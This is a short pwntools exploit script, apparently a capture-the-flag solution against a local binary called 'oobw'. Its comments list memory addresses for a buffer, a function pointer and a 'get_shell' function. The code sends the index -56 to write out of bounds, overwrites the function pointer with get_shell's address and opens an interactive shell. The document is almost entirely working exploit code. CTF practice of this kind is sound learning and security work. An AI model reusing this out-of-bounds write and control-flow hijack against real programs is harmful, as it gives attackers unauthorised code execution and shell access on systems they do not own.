# buf: $rbp-0x110
# idx: $rbp-0x4

# 0x00600ae8  fptr
# check fptr: x/16x 0x00600ae8

# 0x00600b20  buf

# get_shell: 0x004005eb

# 0x05c70000      0x00000040


from pwn import *

p = process("./oobw")

p.sendline('-56')

get_shell = 0x004005eb
p.sendline(p64(get_shell))

p.interactive()
